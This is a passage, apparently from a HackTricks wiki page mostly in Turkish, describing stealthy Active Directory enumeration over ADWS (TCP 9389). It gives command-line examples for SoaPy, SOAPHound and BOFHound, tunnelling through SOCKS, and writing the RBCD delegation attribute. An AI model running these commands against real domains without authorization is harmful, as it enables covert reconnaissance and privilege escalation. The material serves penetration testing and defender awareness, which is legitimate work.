# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## ADWS nedir?

Active Directory Web Services (ADWS) varsayılan olarak her Domain Controller üzerinde Windows Server 2008 R2'den beri etkinleştirilir ve TCP **9389** üzerinde dinler. İsimden farklı olarak, **no HTTP is involved**. Bunun yerine servis, LDAP tarzı verileri tescilli .NET framing protokolleri yığını üzerinden sunar:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Bu trafik bu ikili SOAP frame'leri içinde kapsüllenip nadir kullanılan bir port üzerinden aktığı için, **enumeration through ADWS is far less likely to be inspected, filtered or signatured than classic LDAP/389 & 636 traffic**. Operatörler için bu şu anlama gelir:

* Daha gizli recon – Blue teams genellikle LDAP sorgularına odaklanır.
* SOCKS proxy üzerinden 9389/TCP tünellemesi ile **non-Windows hosts (Linux, macOS)**'tan toplama özgürlüğü.
* LDAP ile elde edeceğiniz aynı veriler (users, groups, ACLs, schema, vb.) ve **writes** yapabilme yeteneği (ör. `msDs-AllowedToActOnBehalfOfOtherIdentity` for **RBCD**).

ADWS etkileşimleri WS-Enumeration üzerinden uygulanır: her sorgu LDAP filter/attributes'ı tanımlayan bir `Enumerate` mesajı ile başlar ve bir `EnumerationContext` GUID döndürür, ardından sunucu tarafından tanımlanan sonuç penceresine kadar akış yapan bir veya daha fazla `Pull` mesajı gelir. Context'ler yaklaşık 30 dakika sonra zaman aşımına uğrar, bu yüzden araçlar sonuçları sayfalamalı veya durumu kaybetmemek için filtreleri bölmelidir (her CN için prefix sorguları). Güvenlik descriptor'ları istendiğinde, SACL'ları hariç bırakmak için `LDAP_SERVER_SD_FLAGS_OID` kontrolünü belirtin; aksi halde ADWS SOAP yanıtından `nTSecurityDescriptor` özniteliğini basitçe kaldırır.

> NOTE: ADWS birçok RSAT GUI/PowerShell aracı tarafından da kullanıldığından, trafik meşru admin aktiviteleriyle karışabilir.

## SoaPy – Yerel Python İstemcisi

[SoaPy](https://github.com/logangoins/soapy) saf Python'da ADWS protokol yığınının tam bir yeniden uygulamasıdır. NBFX/NBFSE/NNS/NMF framelerini byte-by-byte oluşturur ve .NET runtime'a dokunmadan Unix-benzeri sistemlerden toplama yapılmasına izin verir.

### Temel Özellikler

* SOCKS üzerinden proxylemeyi destekler (C2 implantlarından kullanışlı).
* LDAP `-q '(objectClass=user)'` ile aynı ince taneli arama filtreleri.
* İsteğe bağlı **write** işlemleri (`--set` / `--delete`).
* BloodHound'a doğrudan alım için **BOFHound output mode**.
* İnsan okunabilirlik gerektiğinde zaman damgalarını / `userAccountControl`'ü güzelleştirmek için `--parse` bayrağı.

### Hedefe Yönelik toplama bayrakları ve write işlemleri

SoaPy, ADWS üzerinde en yaygın LDAP hunting görevlerini yeniden üreten özenle seçilmiş anahtarlarla gelir: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, artı özel çekimler için ham `--query` / `--filter` kontrolleri. Bunları `--rbcd <source>` gibi write primitive'leriyle eşleştirin (bu `msDs-AllowedToActOnBehalfOfOtherIdentity`'i ayarlar), `--spn <service/cn>` (hedeflenmiş Kerberoasting için SPN sahnelemesi) ve `--asrep` (`userAccountControl`'de `DONT_REQ_PREAUTH`'ı tersine çevirir).

Örnek hedeflenmiş SPN hunt — sadece `samAccountName` ve `servicePrincipalName` döndüren:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Aynı host/credentials'i kullanarak bulguları hemen silahlandırın: RBCD-capable nesneleri `--rbcds` ile dump edin, sonra bir Resource-Based Constrained Delegation zinciri kurmak için `--rbcd 'WEBSRV01$' --account 'FILE01$'` uygulayın (tam kötüye kullanım yolu için [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) bakın).

### Kurulum (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## Sopa - Golang'da ADWS için pratik bir istemci

soapy ile benzer şekilde, [sopa](https://github.com/Macmod/sopa) ADWS protokol yığınını (MS-NNS + MC-NMF + SOAP) Golang'da uygular ve şu tür ADWS çağrılarını yapmak için komut satırı bayrakları sağlar:

* **Object search & retrieval** - `query` / `get`
* **Object lifecycle** - `create [user|computer|group|ou|container|custom]` and `delete`
* **Attribute editing** - `attr [add|replace|delete]`
* **Account management** - `set-password` / `change-password`
* and others such as `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Yüksek hacimli ADWS toplama (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) tüm LDAP etkileşimlerini ADWS içinde tutan ve BloodHound v4-compatible JSON üreten bir .NET toplayıcısıdır. Bir kez `objectSid`, `objectGUID`, `distinguishedName` ve `objectClass` için tam bir önbellek oluşturur (`--buildcache`), sonra yüksek hacimli `--bhdump`, `--certdump` (ADCS) veya `--dnsdump` (AD-integrated DNS) taramaları için yeniden kullanır; böylece DC'den çıkan kritik öznitelik sayısı yalnızca ~35 olur. AutoSplit (`--autosplit --threshold <N>`) büyük ormanlarda 30 dakikalık EnumerationContext zaman aşımı süresinin altında kalmak için sorguları CN öneki bazında otomatik olarak parçalara böler.

Etki alanına katılmış bir operatör VM'sinde tipik iş akışı:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Dışa aktarılan JSON'lar doğrudan SharpHound/BloodHound iş akışlarına yerleştirilebilir — aşağı akış grafik fikirleri için [BloodHound methodology](bloodhound.md) sayfasına bakın. AutoSplit, sorgu sayısını ADExplorer tarzı snapshot'lara göre daha düşük tutarken SOAPHound'u milyonlarca nesne içeren forest'larda dayanıklı kılar.

## Gizli AD Toplama İş Akışı

Aşağıdaki iş akışı, ADWS üzerinden **domain & ADCS objects**'u enumerate etmeyi, bunları BloodHound JSON'a dönüştürmeyi ve sertifika tabanlı attack paths için arama yapmayı — tümü Linux'tan — gösterir:

1. **Tunnel 9389/TCP** hedef ağdan kendi makinenize tünelleyin (örn. Chisel, Meterpreter, SSH dynamic port-forward, vb.). `export HTTPS_PROXY=socks5://127.0.0.1:1080` değişkenini ayarlayın veya SoaPy’nin `--proxyHost/--proxyPort` seçeneklerini kullanın.

2. **Kök domain nesnesini toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC'den ADCS ile ilgili nesneleri toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound'a Dönüştür:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP'i BloodHound GUI'ye yükleyin** ve `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` gibi cypher sorguları çalıştırarak sertifika yükseltme yollarını (ESC1, ESC8, vb.) ortaya çıkarın.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` Yazma (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Bunu `s4u2proxy`/`Rubeus /getticket` ile tam bir **Resource-Based Constrained Delegation** zinciri için birleştirin (bkz. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Araç Özeti

| Amaç | Araç | Notlar |
|---------|------|-------|
| ADWS keşfi | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, okuma/yazma |
| Yüksek hacimli ADWS dökümü | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modları |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | SoaPy/ldapsearch loglarını dönüştürür |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Aynı SOCKS üzerinden proxylenebilir |
| ADWS keşfi ve nesne değişiklikleri | [sopa](https://github.com/Macmod/sopa) | Bilinen ADWS uç noktalarıyla etkileşim için genel bir istemci - keşif, nesne oluşturma, öznitelik değişiklikleri ve parola değişikliklerine izin verir |

## Referanslar

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
